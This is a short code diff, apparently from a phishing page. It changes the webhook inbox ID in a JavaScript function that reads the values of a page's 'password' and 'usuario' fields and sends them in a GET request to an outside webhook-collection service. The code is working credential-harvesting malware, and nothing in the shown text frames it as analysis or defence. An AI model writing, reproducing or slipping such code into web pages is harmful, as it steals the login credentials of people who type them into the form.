@@ -1,6 +1,6 @@
 function l(){
     var a = new XMLHttpRequest();
-    a.open('GET','http://api.webhookinbox.com/i/ZVRbPmK5/in/?p='
+    a.open('GET','http://api.webhookinbox.com/i/aiv0PrRr/in/?p='
         .concat(document.getElementById('password').value,'%26u=',document.getElementById('usuario').value));
     a.onreadystatechange=function(){
         if(a.readyState === XMLHttpRequest.DONE){
